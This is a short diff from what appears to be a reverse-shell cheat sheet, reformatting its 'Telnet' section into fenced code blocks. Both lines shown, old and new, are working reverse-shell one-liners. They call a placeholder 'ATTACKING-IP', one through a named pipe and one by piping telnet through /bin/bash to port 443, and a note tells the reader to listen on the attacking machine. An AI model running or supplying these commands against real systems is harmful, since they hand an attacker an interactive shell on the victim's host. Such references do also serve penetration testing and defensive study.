@@ -79,10 +79,12 @@ If you have the wrong version of netcat installed, Jeff Price points out here th
 
 # Telnet 
 
-
-	rm -f /tmp/p; mknod /tmp/p p && telnet ATTACKING-IP 80 0/tmp/p
-
-	telnet ATTACKING-IP 80 | /bin/bash | telnet ATTACKING-IP 443
+~~~
+rm -f /tmp/p; mknod /tmp/p p && telnet ATTACKING-IP 80 0/tmp/p
+~~~
+~~~
+telnet ATTACKING-IP 80 | /bin/bash | telnet ATTACKING-IP 443
+~~~
 
 Remember to listen on 443 on the attacking machine also.
 
